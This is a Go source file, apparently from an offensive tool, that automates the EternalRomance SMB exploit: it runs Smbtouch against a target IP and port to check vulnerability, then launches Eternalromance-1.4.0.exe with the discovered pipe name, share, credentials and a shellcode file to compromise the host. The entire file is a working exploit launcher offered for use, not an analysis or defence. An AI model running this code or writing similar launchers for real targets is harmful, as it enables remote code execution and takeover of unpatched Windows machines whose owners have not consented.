package exploits

import (
	"eternal/conf"
	"eternal/metatdatas"
	"eternal/utils"
	"fmt"
	"os/exec"
	"path/filepath"
)

func EternalRomance() {
	metatdatas.MetaData.SetShellcodeFile()
	filename := filepath.Join(metatdatas.MetaData.LogDir, metatdatas.MetaData.ProjectName, utils.CreateXmlFileName("Smbtouch"))
	cmd := exec.Command(conf.Touches+"Smbtouch-1.1.1.exe", "--InConfig", conf.Touches+"Smbtouch-1.1.1.0.xml", "--OutConfig", filename, "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Protocol", metatdatas.MetaData.Protocol, "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout)
	utils.Execute(cmd)
	results := utils.ParseSmbXml(filename)
	if results == nil {
		fmt.Println(utils.ColorPrint(-1, "Not Vuln."))
		return
	}
	cmd = exec.Command(filepath.Join(conf.Exploits, "Eternalromance-1.4.0.exe"), "--InConfig", filepath.Join(conf.Exploits, "Eternalromance-1.4.0.0.xml"), "--OutConfig", filepath.Join(metatdatas.MetaData.LogDir, "logs.txt"), "--TargetIp", metatdatas.MetaData.TargetIp, "--TargetPort", metatdatas.MetaData.TargetPort, "--Target", results["Target"], "--NetworkTimeout", metatdatas.MetaData.NetworkTimeout, "--Protocol", results["Protocol"], "--PipeName", results["PipeName"], "--TargetOsArchitecture", results["TargetOsArchitecture"], "--Credentials", results["Credentials"], "--ShareName", results["ShareName"], "--ExploitMethod", "Default", "--ShellcodeFile", metatdatas.MetaData.ShellcodeFile)
	metatdatas.MetaData.ShowMetaData()
	utils.Execute(cmd)
}
